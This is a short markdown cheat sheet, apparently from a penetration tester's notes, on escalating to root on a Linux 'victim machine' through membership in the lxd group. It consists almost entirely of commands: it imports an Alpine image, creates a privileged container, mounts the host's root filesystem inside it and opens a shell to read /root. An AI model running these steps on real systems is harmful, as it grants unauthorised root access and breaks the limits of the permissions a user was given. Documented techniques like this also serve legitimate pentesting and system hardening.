How to escalate priviledge when user have `lxd` group permission.
## Prepare

Download and create image
```bash
git clone https://github.com/lxd-images/alpine-3-7-apache-php5-6
cd alpine-3-7-apache-php5-6
cat alpine-3-7-apache-php5-6.tar.bz2.* > alpine-3-7-apache-php5-6.tar.bz2
```

## Transfer image to victim machine ( via web, copy)


## Escalate Priviledge
- Import image:
```bash
lxc image import alpine-3-7-apache-php5-6.tar.bz2
```
- Show the image
```bash
lxc image ls
```
- Init the image:
```bash
lxc init IMAGENAME CONTAINERNAME -c security.privileged=true
```
_Ex: lxc init myimage strongbad -c security.privileged=true_
> If you get the error above you need to use the configuration below
```bash
lxd init
```
using default config, then tried to init with `lxc` again

- Check the container
```bash
lxc list
```

- Mount `root` directory to container
```bash
lxc config device add CONTAINERNAME DEVICENAME disk source=/ path=/mnt/root recursive=true
```

_Ex: lxc config device add strongbad trogdor disk source=/ path=/mnt/root recursive=true_

- Start container
```bash
lxc start CONTAINERNAME
```
_Ex: lxc start strongbad_
```sh
lxc exec CONTAINERNAME /bin/sh
```

_Ex: lxc exec strongbad /bin/sh_

- We'll then run just a few more commands to mount our storage and verify we've escalated to root:
```sh
id
cd /mnt/root/root
```
